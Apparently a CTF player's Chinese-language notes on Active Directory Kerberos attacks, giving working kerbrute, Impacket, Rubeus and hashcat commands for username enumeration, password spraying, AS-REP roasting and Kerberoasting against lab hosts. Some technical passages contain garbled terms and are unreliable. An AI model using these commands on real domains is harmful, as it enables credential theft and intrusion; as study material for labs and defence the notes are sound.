# Kerberos

kerberos使用TCP/UDP 88端口进行认证，使用TCP/UDP 464端口进行密码重设。



## 域内用户名枚举

Kerberos协议的AS-REQ阶段，请求包中cname是用户名，当用户状态是用户存在且启用、用户存在且禁用、用户不存在的时候，AS-REP包各不相同。

使用工具：kerbrute或者msf的`auxiliary/gather/kerberos_enumusers`模块。

```shell
./kerbrute_darwin_amd64 userenum --dc 10.10.10.175 /Users/feng/many-ctf/SecLists/Usernames/xato-net-10-million-usernames.txt -d egotistical-bank.local
```



可以拿username-anarchy工具来制作字典：

```shell
feng at fengs-MacBook-Pro.local in [~/ctftools/username-anarchy]  on git:master ✗  d5e653f "updated README"
12:10:27 › ./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt
```





## 域内密码喷洒

密码喷洒是用固定的密码去爆破用户名。一般和域内用户名枚举一起使用。

```shell
./kerbrute_darwin_amd64 passwordspray --dc 10.10.10.169 -d megabank.local user.txt 'Welcome123!'
```

但是kerbrute是针对kerberos协议的，遇到其他协议需要用crackmapexec。



## AS-REP Roasting

AS-REP Roasting 是一种对用户账户进行离线爆破的攻击方式。但是该攻击方式使用上比较受限，因为其**需要用户账户设置“不要求 Kerberos 预身份验证”选项，而该选项默认是没有勾选的**。Kerberos 项身份验证发生在 Kerberos 身份验证的第一阶段 (AS_ REQ &AS_REP)，它的主要作用是防止密码离线爆破。默认情況下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。
当关用了预身份验证后，攻击者可以使用指定用户向域控制器的 Kerberos 88 端口请求票据，**此时城控不会进行任何验证就將TGT 和该用户 Fash 加密的 Iogin Session Key返回**。
因此，攻击者就可以对获取到的用户 Hash 加密的 Loein Sesion Kcey进行离线破得，如果宇典够强大，则可能破解得到该指定用户的明文密码。

```shell
GetNPUsers.py -dc-ip 10.10.10.161 htb.local/svc-alfresco -request
```

```shell
python3.10 GetNPUsers.py -dc-ip 10.10.10.175 egotistical-bank.local/ -usersfile ~/ctftools/username-anarchy/unames.txt
```

然后拿hashcat爆破：

```shell
hashcat -m 18200 hash.txt /Users/feng/many-ctf/rockyou.txt --force
```

需要注意的是AS-REP Roasting的时候hashcat的-m是18200，其他的时候不是。



## Kerberoasting

这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。.正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash。



```shell
python3.10 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
```



```shell
.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /outfile:hash.txt
```



得到hash后拿hashcat爆破：

```shell
hashcat -m 13100 hash.txt /Users/feng/many-ctf/rockyou.txt --force
```



## 非约束性委派攻击



## 约束性委派攻击

从网络攻击的角度来看，如果攻击者控制了服务1的账户，并且服务1配置丁到域控的CIFS 的约束性委派，则可以利用服务1以任意用户权限(包括域管理员）访问域控的CIFS， 即相当于控制了域控。

### 基于资源的约束性委派攻击

1. 拥有服务 A 的权限，这里只需要拥有一个普通的域账户权限即可，因为普通的域账户默认可以创建最多10个机器账户，机器账户可以作为服务账户使用。
2. 拥有在服务 B上配置允许服务A 的基于资源的约束性委派的权限，即拥有修改服务B的msDS-AllowedToActOuBsehalfOfotherldentity 属性的权限。机器账户自身和创建机器账户的用户即拥有该权限。

## Kerberos Bronze Bit漏洞

对于约束性委派和基于资源的约束性委派，最后不返回票据的原因各不相同。但是，只要 rorwardable 标志位为 1，则约束性委派和基于资源的约束性委派在 S402Proxy 这一步均能获得票据。因此，我们后续的攻击就能成功。
